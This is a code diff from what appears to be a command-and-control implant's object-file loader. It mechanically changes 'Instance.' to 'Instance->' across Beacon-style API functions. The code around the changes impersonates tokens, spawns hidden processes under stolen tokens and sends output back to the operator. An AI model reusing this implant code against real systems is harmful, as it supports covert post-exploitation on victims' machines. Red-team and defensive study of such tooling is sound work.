@@ -20,7 +20,7 @@
 PVOID LdrModulePebString( PCHAR ModuleString )
 {
     PRINTF( "ModuleString: %s : %lx\n", ModuleString, HashEx( ModuleString, 0, TRUE ) )
-    return Instance.Win32.GetModuleHandleA( ModuleString );
+    return Instance->Win32.GetModuleHandleA( ModuleString );
 }
 
 PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
@@ -31,12 +31,12 @@ PVOID LdrFunctionAddrString( PVOID Module, PCHAR Function )
 
 BOOL LdrFreeLibrary( HMODULE hLibModule )
 {
-    return Instance.Win32.FreeLibrary( hLibModule );
+    return Instance->Win32.FreeLibrary( hLibModule );
 }
 
 HLOCAL LdrLocalFree( PVOID hMem )
 {
-    return Instance.Win32.LocalFree( hMem );
+    return Instance->Win32.LocalFree( hMem );
 }
 
 COFFAPIFUNC BeaconApi[] = {
@@ -223,7 +223,7 @@ PCHAR BeaconDataExtract( PDATA parser, PINT size )
  */
 BOOL GetRequestIDForCallingObjectFile( PVOID CoffeeFunctionReturn, PUINT32 RequestID )
 {
-    PCOFFEE Entry = Instance.Coffees;
+    PCOFFEE Entry = Instance->Coffees;
 
     if ( ! CoffeeFunctionReturn || ! RequestID )
         return FALSE;
@@ -268,24 +268,24 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
 
     va_start( VaListArg, fmt );
 
-    CallbackSize = Instance.Win32.vsnprintf( NULL, 0, fmt, VaListArg );
+    CallbackSize = Instance->Win32.vsnprintf( NULL, 0, fmt, VaListArg );
     if ( CallbackSize < 0 ) {
         PUTS( "Failed to calculate final string length" )
         va_end( VaListArg );
         return;
     }
 
-    CallbackOutput = Instance.Win32.LocalAlloc( LPTR, CallbackSize + 1 );
+    CallbackOutput = Instance->Win32.LocalAlloc( LPTR, CallbackSize + 1 );
     if ( ! CallbackOutput ) {
         PUTS( "Failed to allocate CallbackOutput" );
         va_end( VaListArg );
         return;
     }
 
-    if ( Instance.Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg ) < 0 ) {
+    if ( Instance->Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg ) < 0 ) {
         PUTS( "Failed to format string" )
         MemSet( CallbackOutput, 0, CallbackSize );
-        Instance.Win32.LocalFree( CallbackOutput );
+        Instance->Win32.LocalFree( CallbackOutput );
         va_end( VaListArg );
         return;
     }
@@ -299,7 +299,7 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
     PackageTransmit( package );
 
     MemSet( CallbackOutput, 0, CallbackSize );
-    Instance.Win32.LocalFree( CallbackOutput );
+    Instance->Win32.LocalFree( CallbackOutput );
 }
 
 VOID BeaconOutput( INT Type, PCHAR data, INT len )
@@ -345,7 +345,7 @@ VOID BeaconFormatAlloc( PFORMAT format, int maxsz )
     if ( format == NULL )
         return;
 
-    format->original = Instance.Win32.LocalAlloc(maxsz, 1);
+    format->original = Instance->Win32.LocalAlloc(maxsz, 1);
     format->buffer = format->original;
     format->length = 0;
     format->size = maxsz;
@@ -365,7 +365,7 @@ VOID BeaconFormatFree( PFORMAT format )
 
     if ( format->original )
     {
-        Instance.Win32.LocalFree( format->original );
+        Instance->Win32.LocalFree( format->original );
         format->original = NULL;
     }
 
@@ -387,7 +387,7 @@ VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
     int     length = 0;
 
     va_start( args, fmt );
-    length = Instance.Win32.vsnprintf( NULL, 0, fmt, args );
+    length = Instance->Win32.vsnprintf( NULL, 0, fmt, args );
     va_end( args );
     if ( format->length + length > format->size )
     {
@@ -395,7 +395,7 @@ VOID BeaconFormatPrintf( PFORMAT format, char* fmt, ... )
     }
 
     va_start( args, fmt );
-    Instance.Win32.vsnprintf( format->buffer, length, fmt, args );
+    Instance->Win32.vsnprintf( format->buffer, length, fmt, args );
     va_end( args );
 
     format->length += length;
@@ -430,7 +430,7 @@ BOOL BeaconUseToken( HANDLE token )
         return FALSE;
     }
 
-    if ( ! Instance.Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
+    if ( ! Instance->Win32.SetThreadToken( NULL, hImpersonateToken ) ) {
         return FALSE;
     }
 
@@ -446,9 +446,9 @@ VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
         return;
 
     if ( x86 ) {
-        Path = Instance.Config.Process.Spawn86;
+        Path = Instance->Config.Process.Spawn86;
     } else {
-        Path = Instance.Config.Process.Spawn64;
+        Path = Instance->Config.Process.Spawn64;
     }
 
     Size = StringLengthW( Path ) * sizeof( WCHAR );
@@ -467,18 +467,18 @@ BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo
     PWCHAR  Path        = NULL;
 
     if (x86) {
-        Path = Instance.Config.Process.Spawn86;
+        Path = Instance->Config.Process.Spawn86;
     } else {
-        Path = Instance.Config.Process.Spawn64;
+        Path = Instance->Config.Process.Spawn64;
     }
 
     if (ignoreToken)
     {
-        bSuccess = Instance.Win32.CreateProcessW(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
+        bSuccess = Instance->Win32.CreateProcessW(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
     else
     {
-        bSuccess = Instance.Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, Path, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, sInfo, pInfo);
+        bSuccess = Instance->Win32.CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, Path, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, sInfo, pInfo);
     }
 
     return bSuccess;
@@ -607,7 +607,7 @@ BOOL BeaconAddValue(const char * key, void * ptr)
     }
 
     // make sure the key doesn't already exist
-    KeyValue = Instance.CoffeKeyValueStore;
+    KeyValue = Instance->CoffeKeyValueStore;
     while ( KeyValue )
     {
         if ( StringCompareA( KeyValue->Key, key ) == 0 ) {
@@ -618,14 +618,14 @@ BOOL BeaconAddValue(const char * key, void * ptr)
         KeyValue = KeyValue->Next;
     }
 
-    KeyValue = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE_KEY_VALUE ) );
+    KeyValue = Instance->Win32.LocalAlloc( LPTR, sizeof( COFFEE_KEY_VALUE ) );
 
     KeyValue->Value = ptr;
     StringCopyA( KeyValue->Key, key );
 
     // store the new item at the start of the list
-    KeyValue->Next = Instance.CoffeKeyValueStore;
-    Instance.CoffeKeyValueStore = KeyValue;
+    KeyValue->Next = Instance->CoffeKeyValueStore;
+    Instance->CoffeKeyValueStore = KeyValue;
 
     return TRUE;
 }
@@ -640,7 +640,7 @@ PVOID BeaconGetValue(const char * key)
         return NULL;
     }
 
-    KeyValue = Instance.CoffeKeyValueStore;
+    KeyValue = Instance->CoffeKeyValueStore;
     while ( KeyValue )
     {
         if ( StringCompareA( KeyValue->Key, key ) == 0 ) {
@@ -664,7 +664,7 @@ BOOL BeaconRemoveValue(const char * key)
         return FALSE;
     }
 
-    Current = Instance.CoffeKeyValueStore;
+    Current = Instance->CoffeKeyValueStore;
     while ( Current )
     {
         if ( StringCompareA( Current->Key, key ) == 0 )
@@ -672,7 +672,7 @@ BOOL BeaconRemoveValue(const char * key)
             if ( Prev ) {
                 Prev->Next = Current->Next;
             } else {
-                Instance.CoffeKeyValueStore = Current->Next;
+                Instance->CoffeKeyValueStore = Current->Next;
             }
 
             DATA_FREE( Current, sizeof( COFFEE_KEY_VALUE ) );
